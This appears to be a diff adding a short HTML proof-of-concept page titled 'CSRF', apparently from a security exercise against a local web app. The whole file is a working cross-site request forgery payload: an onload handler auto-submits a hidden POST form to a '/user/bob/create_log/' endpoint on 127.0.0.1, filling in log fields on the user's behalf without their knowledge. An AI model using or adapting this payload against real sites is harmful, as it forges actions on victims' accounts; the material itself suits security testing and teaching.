@@ -1,0 +1,10 @@
+<h2>CSRF</h2>
+<body onload="document.forms[0].submit()"></body>
+<form action="http://127.0.0.1:8000/user/bob/create_log/" method="POST">
+
+<input type="hidden" name="timeoflog" value="2000-10-11T09%3A02"/>
+<input type="hidden" name="login" value="login"/>
+<input type="hidden" name="note" value=""/>
+<input type="submit"/>
+
+</form>
